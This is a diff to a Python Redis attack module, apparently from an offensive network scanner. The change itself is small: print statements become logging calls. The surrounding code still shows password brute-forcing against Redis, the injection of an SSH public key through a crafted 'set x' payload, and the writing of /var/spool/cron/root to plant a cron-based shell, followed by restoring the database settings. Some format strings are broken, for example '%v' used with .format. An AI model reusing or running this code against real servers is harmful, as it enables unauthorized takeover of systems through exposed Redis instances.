@@ -2,6 +2,7 @@ import os
 import sys
 import socket
 from common import config
+from common import  log
 BUFSIZ=65535
 dbfilename=""
 dir=""
@@ -18,7 +19,7 @@ def RedisScan(info):
             if flag:
                 return
             else:
-                print("[-] redis {}:{} {}", info.Host, info.Ports,pwd)
+                log.LogError("[-] redis {}:{} {}", info.Host, info.Ports,pwd)
     except Exception as e:
         pass
 
@@ -37,11 +38,11 @@ def RedisConn(info , pwd ):
             dbfilename, dir, err = getconfig(s)
             if err != None :
                 result = "[+] Redis:{} {}".format(realhost,pwd)
-                print(result)
+                log.LogSuccess(result)
                 return flag
             else:
                 result="[+] Redis:{} {} file:{}/{}".format(realhost, pwd, dir, dbfilename)
-                print(result)
+                log.LogSuccess(result)
         Expoilt(realhost, s)
         return flag
     except Exception as e:
@@ -56,15 +57,15 @@ def Expoilt(realhost, conn):
     if config.RedisFile!="":
         writeok = writekey(conn, config.RedisFile)
         if  not writeok:
-            print("[-] {} SSH write key errer".format(realhost))
+            log.LogError("[-] {} SSH write key errer".format(realhost))
         else:
-            print("[ +] %v SSH public key was written successfully".format(realhost))
+            log.LogSuccess("[ +] %v SSH public key was written successfully".format(realhost))
     if config.RedisShell != "":
         writeok= writecron(conn, config.RedisShell)
         if writeok:
-            print("[+] %v /var/spool/cron/root was written successfully".format(realhost))
+            log.LogSuccess("[+] %v /var/spool/cron/root was written successfully".format(realhost))
         else:
-            print("[-] Redis:"+realhost +"cron write failed")
+            log.LogError("[-] Redis:"+realhost +"cron write failed")
     recoverdb(dbfilename, dir, conn)
 
 
@@ -80,7 +81,7 @@ def writekey(conn ,filename):
             if  "OK" in result:
                 key=Readfile(filename)
                 if len(key)==0:
-                    print("the keyfile {} is empty".format(filename))
+                    log.LogError("[-] the keyfile {} is empty".format(filename))
                     return flag
                 conn.send(bytes("set x \"\\n\\n\\n{}\\n\\n\\n\"\r\n".format(key), 'UTF-8'))
                 result = conn.recv(BUFSIZ).decode()
@@ -112,7 +113,7 @@ def writecron(conn,host):
                     flag = True
         return flag
     except Exception as e:
-        print(e)
+        #print(e)
         return flag
 
 
@@ -124,7 +125,7 @@ def Readfile(filename ):
             if text!="":
                 return  text
     except:
-        print("Open %s error\n" % filename)
+        log.LogError("[-] Open %s error\n" % filename)
         sys.exit(1)
     else:
         f.close()
@@ -151,12 +152,10 @@ def RedisUnauth(info):
             dbfilename, dir, err = getconfig(s)
             if err!=None:
                 result = "[+] Redis:{} unauthorized".format(info.Host + +":" + info.Ports)
-                # ToDo common.LogSuccess(result)
-                print(result)
+                log.LogSuccess(result)
             else:
                 result="[+] Redis:{} unauthorized file:{}/{}".format( info.Host +":" + info.Ports,dir,dbfilename)
-                # ToDo common.LogSuccess(result)
-                print(result)
+                log.LogSuccess(result)
         s.close()
     except Exception as e:
         #print(e)
